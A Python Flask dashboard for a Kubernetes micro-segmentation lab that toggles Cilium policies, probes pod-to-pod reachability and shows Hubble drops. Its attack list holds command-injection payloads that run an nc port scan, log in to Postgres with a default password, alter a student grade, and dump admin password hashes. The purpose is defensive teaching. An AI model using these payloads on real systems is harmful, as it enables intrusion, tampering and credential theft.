# Dashboard for the micro-segmentation lab. Run in WSL:  python app.py
# Then open http://localhost:5050 in the Windows browser.
import os
import subprocess
from concurrent.futures import ThreadPoolExecutor

import requests
from flask import Flask, jsonify, send_file

app = Flask(__name__)

PORTAL = "http://127.0.0.1:30080"      # the NodePort, the same door the attacker uses
POLICY_DIR = os.path.expanduser("~/microseg/k8s/policies")
SOURCES = ["frontend", "news", "api", "auth", "db", "admin", "ops"]
TARGETS = [("frontend", 80), ("news", 5000), ("api", 8080), ("auth", 5001), ("db", 5432), ("admin", 5002)]

PSQL = "PGCONNECT_TIMEOUT=3 PGPASSWORD=postgres psql -h db -U postgres -d campus"
SCAN = "nc -zv -w 2 frontend 80; nc -zv -w 2 api 8080; nc -zv -w 2 auth 5001; nc -zv -w 2 db 5432; nc -zv -w 2 admin 5002"

# (step name, text sent in the "url" field, text in the answer that proves the step worked)
ATTACK_STEPS = [
    ("1. T1190 exploit the image checker", "x; id; hostname", "uid="),
    ("2. T1046 discover and scan services", "x; env | grep SERVICE_PORT= | sort; " + SCAN, "succeeded"),
    ("3. T1078.001 log in to db with the default account",
     "x; " + PSQL + " -c 'SELECT id, username, full_name FROM students'", "(4 rows)"),
    ("4. T1565.001 change Omar's grade",
     "x; " + PSQL + " -c 'UPDATE grades SET grade = 95 WHERE id = 3' -c 'SELECT * FROM grades WHERE id = 3'",
     "UPDATE 1"),
    ("5. reach the admin panel and dump users", "x; curl -sS --max-time 3 http://admin:5002/users", "password_hash"),
]


def run(command):
    """Run a command given as a list of words. Return everything it printed."""
    result = subprocess.run(command, capture_output=True, text=True, timeout=120)
    return result.stdout + result.stderr


def probe_from(source):
    """Inside the source pod, try a TCP connect to every other service (all at once, 2 s limit)."""
    lines = []
    for name, port in TARGETS:
        if name != source:
            lines.append(f"(timeout 2 bash -c 'echo > /dev/tcp/{name}/{port}' 2>/dev/null; echo {name}=$?) &")
    lines.append("wait")
    output = run(["kubectl", "-n", "campus", "exec", "deploy/" + source, "--", "bash", "-c", "\n".join(lines)])
    row = {}
    for line in output.splitlines():
        if "=" in line:
            name, code = line.strip().split("=", 1)
            if code == "0":
                row[name] = "open"        # connected
            elif code == "124":
                row[name] = "blocked"     # no answer in 2 s, Cilium dropped it
            else:
                row[name] = "refused"     # fast "no": nothing listening, or DNS error
    return row


@app.get("/")
def index():
    return send_file("index.html")


@app.get("/api/status")
def status():
    policies = []
    for word in run(["kubectl", "-n", "campus", "get", "ciliumnetworkpolicies", "-o", "name"]).split():
        if word.startswith("ciliumnetworkpolicy"):
            policies.append(word.split("/")[1])
    pods = run(["kubectl", "-n", "campus", "get", "pods", "-o", "wide"])
    return jsonify({"policies": policies, "pods": pods})


@app.post("/api/policies/<action>")
def policies(action):
    if action == "apply":
        output = run(["kubectl", "apply", "-f", POLICY_DIR])
    else:
        output = run(["kubectl", "delete", "-f", POLICY_DIR, "--ignore-not-found"])
    return jsonify({"output": output})


@app.get("/api/matrix")
def matrix():
    # Probe all 7 sources at the same time: about 3 s instead of about 20 s.
    with ThreadPoolExecutor(max_workers=len(SOURCES)) as pool:
        rows = list(pool.map(probe_from, SOURCES))
    result = {}
    open_paths = 0
    total_paths = 0
    for source, row in zip(SOURCES, rows):
        result[source] = row
        total_paths += len(row)
        open_paths += list(row.values()).count("open")
    target_names = [name for name, port in TARGETS]
    return jsonify({"sources": SOURCES, "targets": target_names, "matrix": result,
                    "open": open_paths, "total": total_paths})


@app.post("/api/attack")
def attack():
    results = []
    for name, payload, proof in ATTACK_STEPS:
        try:
            answer = requests.post(PORTAL + "/news/check-image", data={"url": payload}, timeout=60)
            output = answer.text
        except requests.RequestException as error:
            output = "request failed: " + str(error)
        results.append({"step": name, "success": proof in output, "output": output})
    return jsonify(results)


@app.get("/api/drops")
def drops():
    output = run(["hubble", "observe", "--namespace", "campus", "--verdict", "DROPPED", "--last", "20"])
    return jsonify({"output": output})


if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5050, threaded=True)
